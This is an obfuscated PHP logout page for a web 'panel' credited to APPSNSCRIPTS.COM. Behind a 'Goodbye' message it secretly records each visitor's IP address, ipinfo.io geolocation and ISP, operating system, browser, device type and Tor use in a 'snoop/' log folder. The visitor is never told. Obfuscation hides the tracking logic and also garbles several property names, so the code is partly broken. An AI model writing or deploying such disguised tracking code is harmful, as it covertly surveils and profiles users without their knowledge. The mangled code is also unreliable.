<?php 
error_reporting(0);
function IIIIIIII1lIl() {
    $IIIIIIII1lI1 = 'undefined';
    if (isset($_SERVER)) {
        $IIIIIIII1lI1 = $_SERVER['REMOTE_ADDR'];
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $IIIIIIII1lI1 = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else if (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $IIIIIIII1lI1 = $_SERVER['HTTP_CLIENT_IP'];
        }
    } else {
        $IIIIIIII1lI1 = getenv('REMOTE_ADDR');
        if (getenv('HTTP_X_FORWARDED_FOR')) {
            $IIIIIIII1lI1 = getenv('HTTP_X_FORWARDED_FOR');
        } else if (getenv('HTTP_CLIENT_IP')) {
            $IIIIIIII1lI1 = getenv('HTTP_CLIENT_IP');
        }
    }
    $IIIIIIII1lI1 = htmlspecialchars($IIIIIIII1lI1, ENT_QUOTES, 'UTF-8');
    return $IIIIIIII1lI1;
}
function IIIIIIII1lll() {
    $IIIIIIII1ll1 = $_SERVER['HTTP_USER_AGENT'];
    $IIIIIIII1l1I = 'Unknown OS Platform';
    $IIIIIIII1l1l = ['/windows nt 10/i' => 'Windows 10', '/windows nt 6.3/i' => 'Windows 8.1', '/windows nt 6.2/i' => 'Windows 8', '/windows nt 6.1/i' => 'Windows 7', '/windows nt 6.0/i' => 'Windows Vista', '/windows nt 5.2/i' => 'Windows Server 2003/XP x64', '/windows nt 5.1/i' => 'Windows XP', '/windows xp/i' => 'Windows XP', '/windows nt 5.0/i' => 'Windows 2000', '/windows me/i' => 'Windows ME', '/win98/i' => 'Windows 98', '/win95/i' => 'Windows 95', '/win16/i' => 'Windows 3.11', '/macintosh|mac os x/i' => 'Mac OS X', '/mac_powerpc/i' => 'Mac OS 9', '/linux/i' => 'Linux', '/ubuntu/i' => 'Ubuntu', '/iphone/i' => 'iPhone', '/ipod/i' => 'iPod', '/ipad/i' => 'iPad', '/android/i' => 'Android', '/blackberry/i' => 'BlackBerry', '/webos/i' => 'Mobile'];
    foreach ($IIIIIIII1l1l as $IIIIIIII1l11 => $IIIIIIII11II) {
        if (preg_match($IIIIIIII1l11, $IIIIIIII1ll1)) {
            $IIIIIIII1l1I = $IIIIIIII11II;
        }
    }
    return $IIIIIIII1l1I;
}
function IIIIIIII11I1() {
    $IIIIIIII1ll1 = $_SERVER['HTTP_USER_AGENT'];
    $IIIIIIII11lI = 'Unknown Browser';
    $IIIIIIII11ll = ['/msie/i' => 'Internet Explorer', '/Trident/i' => 'Internet Explorer', '/firefox/i' => 'Firefox', '/safari/i' => 'Safari', '/chrome/i' => 'Chrome', '/edge/i' => 'Edge', '/opera/i' => 'Opera', '/netscape/i' => 'Netscape', '/maxthon/i' => 'Maxthon', '/konqueror/i' => 'Konqueror', '/ubrowser/i' => 'UC Browser', '/mobile/i' => 'Handheld Browser'];
    foreach ($IIIIIIII11ll as $IIIIIIII1l11 => $IIIIIIII11II) {
        if (preg_match($IIIIIIII1l11, $IIIIIIII1ll1)) {
            $IIIIIIII11lI = $IIIIIIII11II;
        }
    }
    return $IIIIIIII11lI;
}
function IIIIIIII11l1() {
    $IIIIIIII111I = 0;
    $IIIIIIII111l = 0;
    if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
        $IIIIIIII111I++;
    }
    if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
        $IIIIIIII111l++;
    }
    if ((0 < strpos(strtolower($_SERVER['HTTP_ACCEPT']), 'application/vnd.wap.xhtml+xml')) || (isset($_SERVER['HTTP_X_WAP_PROFILE']) || isset($_SERVER['HTTP_PROFILE']))) {
        $IIIIIIII111l++;
    }
    $IIIIIIIlIIIl = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
    $IIIIIIIlIIlI = ['w3c ', 'acs-', 'alav', 'alca', 'amoi', 'audi', 'avan', 'benq', 'bird', 'blac', 'blaz', 'brew', 'cell', 'cldc', 'cmd-', 'dang', 'doco', 'eric', 'hipt', 'inno', 'ipaq', 'java', 'jigs', 'kddi', 'keji', 'leno', 'lg-c', 'lg-d', 'lg-g', 'lge-', 'maui', 'maxo', 'midp', 'mits', 'mmef', 'mobi', 'mot-', 'moto', 'mwbp', 'nec-', 'newt', 'noki', 'palm', 'pana', 'pant', 'phil', 'play', 'port', 'prox', 'qwap', 'sage', 'sams', 'sany', 'sch-', 'sec-', 'send', 'seri', 'sgh-', 'shar', 'sie-', 'siem', 'smal', 'smar', 'sony', 'sph-', 'symb', 't-mo', 'teli', 'tim-', 'tosh', 'tsm-', 'upg1', 'upsi', 'vk-v', 'voda', 'wap-', 'wapa', 'wapi', 'wapp', 'wapr', 'webc', 'winw', 'winw', 'xda ', 'xda-'];
    if (in_array($IIIIIIIlIIIl, $IIIIIIIlIIlI)) {
        $IIIIIIII111l++;
    }
    if (0 < strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'opera mini')) {
        $IIIIIIII111l++;
        $IIIIIIIlIIl1 = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA']) ? $_SERVER['HTTP_X_OPERAMINI_PHONE_UA'] : (isset($_SERVER['HTTP_DEVICE_STOCK_UA']) ? $_SERVER['HTTP_DEVICE_STOCK_UA'] : ''));
        if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $IIIIIIIlIIl1)) {
            $IIIIIIII111I++;
        }
    }
    if (0 < $IIIIIIII111I) {
        return 'Tablet';
    } else if (0 < $IIIIIIII111l) {
        return 'Mobile';
    } else {
        return 'Computer';
    }
}
function IIIIIIIlII1I() {
    if (gethostbyname(IIIIIIIlII1l($_SERVER['REMOTE_ADDR']) . '.' . $_SERVER['SERVER_PORT'] . '.' . IIIIIIIlII1l($_SERVER['SERVER_ADDR']) . '.ip-port.exitlist.torproject.org') == '127.0.0.2') {
        return 'True';
    } else {
        return 'False';
    }
}
function IIIIIIIlII1l($IIIIIIIlII11) {
    $IIIIIIIlIlII = explode('.', $IIIIIIIlII11);
    return $IIIIIIIlIlII[3] . '.' . $IIIIIIIlIlII[2] . '.' . $IIIIIIIlIlII[1] . '.' . $IIIIIIIlIlII[0];
}
$IIIIIIIlIlIl = IIIIIIII1lIl();
$IIIIIIIlIlI1 = json_decode(file_get_contents('https://ipinfo.io/' . $IIIIIIIlIlIl . '/json'));
$IIIIIIIlIllI = $IIIIIIIlIlI1->IIIIIIIlIllI;
$IIIIIIIlIlll = $IIIIIIIlIlI1->region;
$IIIIIIIlIll1 = $IIIIIIIlIlI1->IIIIIIIlIll1;
$IIIIIIIlIl1I = $IIIIIIIlIlI1->org;
$IIIIIIIlIl1I = preg_replace('/AS\d{1,}\s/', '', $IIIIIIIlIl1I);
$IIIIIIIlIl11 = $IIIIIIIlIlI1->IIIIIIIlIl11;
date_default_timezone_set('Europe/London');
$IIIIIIIlI1II = '---------------------------------------------' . "
" . '[TOA] ' . date('Y-m-d H:i:s') . '  [IPV6] ' . IIIIIIII1lIl() . "
" . '[Country] ' . $IIIIIIIlIllI . ' [City] ' . $IIIIIIIlIll1 . ' [State] ' . $IIIIIIIlIlll . ' [ISP] ' . $IIIIIIIlIl1I . "
" . ' [Location] ' . $IIIIIIIlIl11 . "
" . ('[UA] ' . $_SERVER['HTTP_USER_AGENT']) . ' [OS] ' . IIIIIIII1lll() . "
" . ' [Browser] ' . IIIIIIII11I1() . "
" . ' [Device] ' . IIIIIIII11l1() . "
" . '[Tor Browser] ' . IIIIIIIlII1I() . "
";
$IIIIIIIlI1Il = date('d-m-Y H:i:s') . '.log';
if (file_exists('snoop/' . $IIIIIIIlI1Il)) {
    file_put_contents('snoop/' . $IIIIIIIlI1Il . '', $IIIIIIIlI1II . PHP_EOL, FILE_APPEND);
} else {
    file_put_contents('snoop/' . $IIIIIIIlI1Il . '', $IIIIIIIlI1II . PHP_EOL, FILE_APPEND);
}
echo '<style>' . "
";
echo '@import url("https://fonts.googleapis.com/css?family=Share+Tech+Mono|Montserrat:700");' . "
";
echo "
";
echo '* {' . "
";
echo '    margin: 0;' . "
";
echo '    padding: 0;' . "
";
echo '    border: 0;' . "
";
echo '    font-size: 100%;' . "
";
echo '    font: inherit;' . "
";
echo '    vertical-align: baseline;' . "
";
echo '    box-sizing: border-box;' . "
";
echo '    color: inherit;' . "
";
echo '}' . "
";
echo "
";
echo 'body {' . "
";
echo '    height: 100%;' . "
";
echo "	" . 'background-position: center;' . "
";
echo '    background-repeat: no-repeat;' . "
";
echo '    background-size: cover;' . "
";
echo '}' . "
";
echo "
";
echo 'div {' . "
";
echo '    background: rgba(0, 0, 0, 0);' . "
";
echo '    width: 70vw;' . "
";
echo '    position: relative;' . "
";
echo '    top: 50%;' . "
";
echo '    transform: translateY(-50%);' . "
";
echo '    margin: 0 auto;' . "
";
echo '    padding: 30px 30px 10px;' . "
";
echo '    box-shadow: 0 0 150px -20px rgba(0, 0, 0, 0.5);' . "
";
echo '    z-index: 3;' . "
";
echo '}' . "
";
echo "
";
echo 'P {' . "
";
echo '    font-family: "Share Tech Mono", monospace;' . "
";
echo '    color: #f5f5f5;' . "
";
echo '    margin: 0 0 20px;' . "
";
echo '    font-size: 17px;' . "
";
echo '    line-height: 1.2;' . "
";
echo '}' . "
";
echo "
";
echo 'span {' . "
";
echo '    color: #F0DA00;' . "
";
echo '}' . "
";
echo "
";
echo 'i {' . "
";
echo '    color: #36FE00;' . "
";
echo '}' . "
";
echo "
";
echo 'div a {' . "
";
echo '    text-decoration: none;' . "
";
echo '}' . "
";
echo "
";
echo 'b {' . "
";
echo '    color: #81a2be;' . "
";
echo '}' . "
";
echo "
";
echo 'a {' . "
";
echo '    color: #FF2D00;' . "
";
echo '}' . "
";
echo "
";
echo '@keyframes slide {' . "
";
echo '    from {' . "
";
echo '        right: -100px;' . "
";
echo '        transform: rotate(360deg);' . "
";
echo '        opacity: 0;' . "
";
echo '    }' . "
";
echo '    to {' . "
";
echo '        right: 15px;' . "
";
echo '        transform: rotate(0deg);' . "
";
echo '        opacity: 1;' . "
";
echo '    }' . "
";
echo '}' . "
";
echo "
";
echo '</style>' . "
";
echo "
";
echo '<div>' . "
";
echo '<center>' . "
";
echo '<p><span><a>Goodbye!</a></span></p>' . "
";
echo '<p>$ <span><a>This panel was brought to you by APPSNSCRIPTS.COM</a></span></p>' . "
";
echo '<br>' . "
";
echo '<br>' . "
";
echo '<p>$ <span>Logged out at</span>: <i>"';
echo date('d-m-Y H:i:s');
echo '<i>"</p>' . "
";
echo '<br>' . "
";
echo '<br>' . "
";
echo '<p>$ <span><a>Click close to exit this page!!</a></span></p>' . "
";
echo '<br>' . "
";
echo '<span><a button class="btn btn-warning btn-icon-split" id="button" href="./login.php">' . "
";
echo '<span class="icon text-red"><i class="fa fa-cross"></i></span><span class="text">Close</span>' . "
";
echo '</button></a></span>' . "
";
echo "		
";
echo '<script>' . "
";
echo 'var str = document.getElementsByTagName(\'div\')[0].innerHTML.toString();' . "
";
echo 'var i = 0;' . "
";
echo 'document.getElementsByTagName(\'div\')[0].innerHTML = "";' . "
";
echo "
";
echo 'setTimeout(function() {' . "
";
echo '    var se = setInterval(function() {' . "
";
echo '        i++;' . "
";
echo '        document.getElementsByTagName(\'div\')[0].innerHTML = str.slice(0, i) + \'|\';' . "
";
echo '        if (i == str.length) {' . "
";
echo '            clearInterval(se);' . "
";
echo '            document.getElementsByTagName(\'div\')[0].innerHTML = str;' . "
";
echo '        }' . "
";
echo '    }, 10);' . "
";
echo '},0);' . "
";
echo "
";
echo '</script>';